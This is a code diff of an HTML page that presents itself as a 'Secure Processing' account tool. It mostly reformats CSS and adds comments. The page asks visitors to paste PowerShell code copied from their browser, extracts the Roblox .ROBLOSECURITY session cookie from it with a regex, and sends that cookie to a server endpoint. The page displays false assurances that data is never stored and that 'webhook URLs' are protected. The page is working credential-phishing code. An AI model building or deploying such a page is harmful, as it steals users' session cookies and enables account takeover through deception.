@@ -7,43 +7,302 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;700&family=Orbitron:wght@700&display=swap" rel="stylesheet">
     <style>
-        /* CSS from the final implementation */
-        html, body { margin: 0; padding: 0; overflow-x: hidden; height: 100%; }
-        body { background: #000; color: #fff; font-family: 'Inter', sans-serif; background: radial-gradient(circle at center, #0c0c1f 0%, #000000 100%); min-height: 100vh; position: relative; overflow-x: hidden; }
-        .snowflake { position: absolute; color: #fff; font-size: 1.2em; font-weight: normal; text-shadow: 0 0 8px rgba(255, 255, 255, 0.6); animation: fall linear infinite; z-index: 0; pointer-events: none; }
-        @keyframes fall { to { transform: translateY(100vh); } }
-        .glass-button { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border: 2px solid rgba(255, 255, 255, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden; }
-        .glass-button:hover { background: rgba(255, 255, 255, 0.2); transform: translateY(-2px); box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2); border: 2px solid rgba(255, 255, 255, 0.4); }
-        .glass-button::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent); transition: 0.5s; }
-        .glass-button:hover::before { left: 100%; }
-        .tagline { color: rgba(255, 255, 255, 0.6); }
-        .orbitron { font-family: 'Orbitron', sans-serif; }
-        .input-modal { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(15px); border: 2px solid rgba(255, 255, 255, 0.3); position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.8); z-index: 100; padding: 2rem; border-radius: 1rem; opacity: 0; visibility: hidden; transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0.5s; width: 320px; box-shadow: 0 0 30px rgba(0, 100, 255, 0.5); }
-        .input-modal.active { transform: translate(-50%, -50%) scale(1); opacity: 1; visibility: visible; transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0s; }
-        .input-modal input { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.2); color: #fff; width: 100%; padding: 0.75rem; border-radius: 0.5rem; margin-top: 0.75rem; transition: all 0.3s ease; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; }
-        .input-modal input:focus { outline: none; border-color: #4a9eff; box-shadow: 0 0 10px rgba(74, 158, 255, 0.5); }
-        .input-modal button.done-button { background: linear-gradient(45deg, #0066ff, #00ccff); border: none; color: #fff; padding: 0.75rem 1.5rem; border-radius: 0.5rem; margin-top: 1.5rem; transition: all 0.3s ease; font-weight: bold; letter-spacing: 1px; width: 100%; cursor: pointer; }
-        .input-modal button.done-button:hover { background: linear-gradient(45deg, #0055dd, #00aadd); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 100, 255, 0.4); }
-        .close-button { position: absolute; top: 0.5rem; right: 0.5rem; background: rgba(255, 255, 255, 0.1); border: none; color: rgba(255, 255, 255, 0.8); font-size: 1.1rem; cursor: pointer; transition: all 0.3s ease; width: 2rem; height: 2rem; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
-        .close-button:hover { background: rgba(255, 50, 50, 0.5); color: #fff; transform: rotate(90deg); }
-        .main-content { transition: opacity 0.5s ease; position: relative; z-index: 10; width: 100%; max-width: 1200px; margin: 0 auto; }
-        .main-content.hidden { opacity: 0; transition: opacity 0.5s ease; }
-        .error-message { color: rgba(255, 100, 100, 0.8); font-size: 0.8rem; margin-top: 0.5rem; display: none; }
-        .logo-text { background: linear-gradient(45deg, #00ccff, #0066ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 0 10px rgba(0, 102, 255, 0.3); }
-        .status-indicator { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-left: 8px; }
-        .status-online { background-color: #00ff00; box-shadow: 0 0 10px #00ff00; }
-        .footer { background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(5px); border-top: 1px solid rgba(255, 255, 255, 0.1); padding: 1rem; width: 100%; text-align: center; margin-top: auto; }
-        .terminal-style { font-family: 'Courier New', monospace; background: rgba(0, 20, 40, 0.7); padding: 1rem; border-radius: 5px; border: 1px solid rgba(0, 100, 255, 0.5); margin-top: 1rem; font-size: 0.9rem; color: #00ffcc; max-width: 800px; margin: 20px auto; }
-        .glow { animation: glow 2s infinite alternate; }
-        @keyframes glow { from { text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #00ccff, 0 0 20px #00ccff; } to { text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #0066ff, 0 0 40px #0066ff; } }
-        .security-badge { position: absolute; top: 20px; right: 20px; background: rgba(0, 100, 0, 0.3); border: 1px solid rgba(0, 255, 0, 0.5); padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; display: flex; align-items: center; }
-        .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; width: 100%; max-width: 1200px; padding: 0 20px; box-sizing: border-box; }
-        .tool-card { height: 150px; }
-        .header-container { padding: 20px; text-align: center; }
-        ::-webkit-scrollbar { width: 0px; background: transparent; }
-        .success-check { color: #00ff00; font-size: 2rem; margin-bottom: 1rem; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top: 4px solid #00ccff; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        html, body {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            height: 100%;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at center, #0c0c1f 0%, #000000 100%);
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .snowflake {
+            position: absolute;
+            color: #fff;
+            font-size: 1.2em;
+            font-weight: normal;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.6);
+            animation: fall linear infinite;
+            z-index: 0;
+            pointer-events: none;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        
+        .glass-button {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .glass-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+        }
+        
+        .glass-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .glass-button:hover::before {
+            left: 100%;
+        }
+        
+        .tagline {
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        .orbitron {
+            font-family: 'Orbitron', sans-serif;
+        }
+        
+        .input-modal {
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            z-index: 100;
+            padding: 2rem;
+            border-radius: 1rem;
+            opacity: 0;
+            visibility: hidden;
+            transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0.5s;
+            width: 320px;
+            box-shadow: 0 0 30px rgba(0, 100, 255, 0.5);
+        }
+        
+        .input-modal.active {
+            transform: translate(-50%, -50%) scale(1);
+            opacity: 1;
+            visibility: visible;
+            transition: transform 0.5s ease, opacity 0.5s ease, visibility 0s linear 0s;
+        }
+        
+        .input-modal input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            width: 100%;
+            padding: 0.75rem;
+            border-radius: 0.5rem;
+            margin-top: 0.75rem;
+            transition: all 0.3s ease;
+            font-family: 'Orbitron', sans-serif;
+            letter-spacing: 1px;
+        }
+        
+        .input-modal input:focus {
+            outline: none;
+            border-color: #4a9eff;
+            box-shadow: 0 0 10px rgba(74, 158, 255, 0.5);
+        }
+        
+        .input-modal button.done-button {
+            background: linear-gradient(45deg, #0066ff, #00ccff);
+            border: none;
+            color: #fff;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            margin-top: 1.5rem;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            letter-spacing: 1px;
+            width: 100%;
+            cursor: pointer;
+        }
+        
+        .input-modal button.done-button:hover {
+            background: linear-gradient(45deg, #0055dd, #00aadd);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 100, 255, 0.4);
+        }
+        
+        .close-button {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 2rem;
+            height: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close-button:hover {
+            background: rgba(255, 50, 50, 0.5);
+            color: #fff;
+            transform: rotate(90deg);
+        }
+        
+        .main-content {
+            transition: opacity 0.5s ease;
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .main-content.hidden {
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        
+        .error-message {
+            color: rgba(255, 100, 100, 0.8);
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+            display: none;
+        }
+        
+        .logo-text {
+            background: linear-gradient(45deg, #00ccff, #0066ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 10px rgba(0, 102, 255, 0.3);
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-left: 8px;
+        }
+        
+        .status-online {
+            background-color: #00ff00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        
+        .footer {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(5px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 1rem;
+            width: 100%;
+            text-align: center;
+            margin-top: auto;
+        }
+        
+        .terminal-style {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 20, 40, 0.7);
+            padding: 1rem;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 100, 255, 0.5);
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #00ffcc;
+            max-width: 800px;
+            margin: 20px auto;
+        }
+        
+        .glow {
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #00ccff, 0 0 20px #00ccff;
+            }
+            to {
+                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #0066ff, 0 0 40px #0066ff;
+            }
+        }
+        
+        .security-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 100, 0, 0.3);
+            border: 1px solid rgba(0, 255, 0, 0.5);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .grid-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            width: 100%;
+            max-width: 1200px;
+            padding: 0 20px;
+            box-sizing: border-box;
+        }
+        
+        .tool-card {
+            height: 150px;
+        }
+        
+        .header-container {
+            padding: 20px;
+            text-align: center;
+        }
+        
+        /* Scrollbar styling (hidden) */
+        ::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+        
+        .success-check {
+            color: #00ff00;
+            font-size: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #00ccff;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="flex flex-col items-center min-h-screen">
@@ -51,7 +310,7 @@
         🔒 Secure Processing
         <span class="status-indicator status-online"></span>
     </div>
-
+    
     <div class="main-content" id="mainContent">
         <div class="header-container">
             <h1 class="text-4xl sm:text-5xl md:text-6xl font-bold tracking-widest uppercase orbitron">
@@ -112,16 +371,17 @@
         <input type="text" placeholder="Paste PowerShell code here" class="focus:outline-none" id="codeInput">
         <p class="error-message" id="errorMessage">Invalid PowerShell code. Please ensure it contains the required commands.</p>
         <button class="done-button" onclick="validateCode()">Process Code</button>
-
+        
         <div class="mt-4 text-xs tagline">
             <p>ℹ️ Security Notice:</p>
             <p>- All processing happens securely on our servers</p>
             <p>- Your data is never stored or shared</p>
-            <p>- Network URLs are fully protected</p>
+            <p>- Webhook URLs are fully protected</p>
         </div>
     </div>
 
     <script>
+        // Create snowflake effect
         function createSnowflake() {
             const snowflake = document.createElement('div');
             snowflake.className = 'snowflake';
@@ -137,6 +397,7 @@
             }, 10000);
         }
 
+        // Modal functions
         function showInputModal(prompt) {
             const mainContent = document.getElementById('mainContent');
             const inputModal = document.getElementById('inputModal');
@@ -160,26 +421,30 @@
             }, 300);
         }
 
+        // Function to send cookie to server for processing
         async function processCookieOnServer(cookie) {
             try {
+                // Show processing indicator
                 const originalText = document.getElementById('modalPrompt').innerText;
                 document.getElementById('modalPrompt').innerHTML = '<div class="text-center"><div class="spinner"></div><br>🔍 Processing account data...</div>';
                 document.getElementById('codeInput').disabled = true;
                 document.querySelector('.done-button').disabled = true;
                 document.querySelector('.done-button').innerText = 'Processing...';
-
+                
+                // Call serverless function
                 const response = await fetch('/api/process-cookie', {
                     method: 'POST',
-                    headers: {
+                    headers: { 
                         'Content-Type': 'application/json',
                         'Authorization': 'Bearer secure-token-2025'
                     },
                     body: JSON.stringify({ cookie })
                 });
-
+                
                 const data = await response.json();
-
+                
                 if (data.success) {
+                    // Show success message
                     document.getElementById('modalPrompt').innerHTML = '<div class="text-center"><div class="success-check">✓</div>✅ Account data processed successfully!</div>';
                     document.querySelector('.done-button').innerText = 'Close';
                     document.querySelector('.done-button').onclick = hideInputModal;
@@ -200,41 +465,50 @@
             }
         }
 
-function validateCode() {
-  const code = document.getElementById('codeInput').value;
-  const errorMessage = document.getElementById('errorMessage');
-  const requiredLines = [
-    '$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession',
-    '$session.Cookies.Add((New-Object System.Net.Cookie(',
-    'Invoke-WebRequest -UseBasicParsing -Uri'
-  ];
+        // Validate PowerShell code and extract cookie
+        function validateCode() {
+            const code = document.getElementById('codeInput').value;
+            const errorMessage = document.getElementById('errorMessage');
+            const requiredLines = [
+                '$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession',
+                '$session.Cookies.Add((New-Object System.Net.Cookie(',
+                'Invoke-WebRequest -UseBasicParsing -Uri'
+            ];
 
-  // Create a normalized version of the code without backticks and extra spaces
-  const normalizedCode = code
-    .replace(/`/g, '') // Remove backticks
-    .replace(/\s+/g, ' ') // Collapse multiple spaces
-    .trim();
+            const normalizedCode = code
+                .replace(/`/g, '')
+                .replace(/\s+/g, ' ')
+                .trim();
 
-  const isValid = requiredLines.every(line =>
-    normalizedCode.includes(line.replace(/\s+/g, ' ').trim())
-  );
+            const isValid = requiredLines.every(line => 
+                normalizedCode.includes(line.replace(/\s+/g, ' ').trim())
+            );
 
-  if (isValid) {
-    const cookieRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",/;
-    const match = normalizedCode.match(cookieRegex);
+            if (isValid) {
+                const cookieRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)",/;
+                const match = normalizedCode.match(cookieRegex);
 
-    if (match && match[1]) {
-      const cookieValue = match[1];
-      processCookieOnServer(cookieValue);
-    } else {
-      errorMessage.innerText = "Could not extract .ROBLOSECURITY cookie from code";
-      errorMessage.style.display = 'block';
-    }
-  } else {
-    errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
-    errorMessage.style.display = 'block';
-  }
-}
+                if (match && match[1]) {
+                    const cookieValue = match[1];
+                    processCookieOnServer(cookieValue);
+                } else {
+                    errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
+                    errorMessage.style.display = 'block';
+                }
+            } else {
+                errorMessage.innerText = "Invalid PowerShell code. Please ensure it contains the required commands.";
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        // Create initial snowflakes
+        for (let i = 0; i < 30; i++) {
+            setTimeout(() => createSnowflake(), i * 300);
+        }
+        setInterval(createSnowflake, 500);
+        
+        // Prevent scrollbar from appearing
+        document.body.style.overflow = 'hidden';
     </script>
 </body>
 </html>
